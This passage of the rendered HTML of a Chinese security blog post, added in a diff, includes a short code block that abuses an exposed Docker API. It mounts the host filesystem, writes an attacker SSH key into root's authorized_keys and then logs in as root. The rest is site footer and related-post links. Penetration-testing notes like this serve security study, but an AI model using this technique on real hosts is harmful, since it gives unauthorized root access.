+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="981"
+		data-flex-basis="2356px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">#</span><span class="n">挂载宿主机的</span><span class="o">/</span><span class="n">mnt目录写入公钥</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">docker</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="n">tcp</span><span class="p">:</span><span class="c1">//1.1.1.1 run -it -v /:/mnt --entrypoint /bin/bash [images name]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">echo</span><span class="w"> </span><span class="s">&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2oUPAuPkNYqvVTALPCfUDxX5yEgBsaV1s+A3Jyk83CJxWwS7e327gvtIPO1VGY4QHpZMLAoi5SdO4Ru9Wm8E2ZojVTyb5pHTDZf1XizXXCakO39u5mT0ET/rwga5NVllp2ApdL4sL9wBihvHi1dlDTBUQvArpRPgKSnrBSPSADIBc4o6GSEBU6EUJMV5rtqNexQq53636ZiLjpLLEjJBsYXDpRU46mxQJjm/LqCENHdqVsvgoGXBqcDWjGqv59yn2KqgKKPs= root@admin&#34;</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="na">ssh</span><span class="o">/</span><span class="n">authorized_keys</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">连接目标主机获取shell</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ssh</span><span class="w"> </span><span class="n">root</span><span class="nd">@1.1.1.1</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="n">id_rsa</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="42docker容器逃逸漏洞">4.2.Docker容器逃逸漏洞
+</h3><p><a class="link" href="https://blog.csdn.net/qq_42383069/article/details/124634135"  target="_blank" rel="noopener"
+    >https://blog.csdn.net/qq_42383069/article/details/124634135</a></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>By Lsec</span>
+    </section>
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 Jan 14, 2026 17:01 &#43;0800
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/">
+        
+        
+            <div class="article-image">
+                <img src="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/logo.cf6b552cc3263892bc02ddaf07e6e7f6_hu7aa57c2307c5d87743a54f76552536bc_313547_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post XXL Job常见漏洞"
+                        
+                        data-hash="md5-z2tVLMMmOJK8At2vB&#43;bn9g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">XXL Job常见漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/graphql%E5%AE%89%E5%85%A8/">
+        
+        
+            <div class="article-image">
+                <img src="/p/graphql%E5%AE%89%E5%85%A8/logo.1a72f6bd258a53b16685f9ddce181b8b_hub20bbea5694ca3a59339a693ae8ca887_27460_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post GraphQL安全"
+                        
+                        data-hash="md5-GnL2vSWKU7Fmhfndzhgbiw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">GraphQL安全</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/">
+        
+        
+            <div class="article-image">
+                <img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/logo.f83219c84d954b3f3875a993a190ecba_hub25acf04595c8d05c82f10f66875711c_26957_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Ruoyi快速打点"
+                        
+                        data-hash="md5-&#43;DIZyE2VSz84damToZDsug==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Ruoyi快速打点</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/jadx-ai-mcp/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">JADX AI MCP</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/next.js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/">
+        
+        
+            <div class="article-image">
+                <img src="/p/next.js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/logo.d17b66a8326b901fbf01fc0ac9855f0d_hu424a00bfa185708aa761f0cd11881b75_8394_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Next.js常见漏洞"
+                        
+                        data-hash="md5-0XtmqDJrkB&#43;/AfwKyYVfDQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Next.js常见漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 Lsec&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>���¹鵵ҳ</title>
+    
+    <script defer src="https://cn.vercount.one/js"></script>
+</head>
+<body>
+</body>
+</html>
+    </body>
+</html>
